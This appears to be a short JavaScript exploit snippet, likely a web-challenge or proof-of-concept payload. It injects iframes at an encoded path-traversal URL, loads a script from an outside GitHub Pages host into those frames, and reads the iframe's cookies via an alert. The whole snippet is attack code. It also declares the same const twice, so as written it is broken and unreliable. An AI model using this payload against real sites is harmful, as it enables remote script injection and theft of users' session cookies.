
const iframe = document.querySelector('.asd');

iframe.addEventListener('load', () => {
    const iframeWindow = iframe.contentWindow;
    const documentIframeWindow = iframeWindow.document;

    const injectedFrame=document.createElement("iframe");
    injectedFrame.src="/%2e%2e%2f";
    documentIframeWindow.body.appendChild(injectedFrame);
    script=document.createElement('script');
    script.src='https://vasilevigor3.github.io/myjs.js';
    iframeWindow.frames[0].document.head.appendChild(script);

    const injectedFrame=document.createElement("iframe");
    injectedFrame.src="/%2e%2e%2f";
    documentIframeWindow.body.appendChild(injectedFrame);
    script=document.createElement('script');
    script.src='https://vasilevigor3.github.io/myjs.js';
    iframeWindow.frames[1].document.head.appendChild(script);
    
    iframeWindow.alert(iframe.contentWindow.document.cookie);		
});
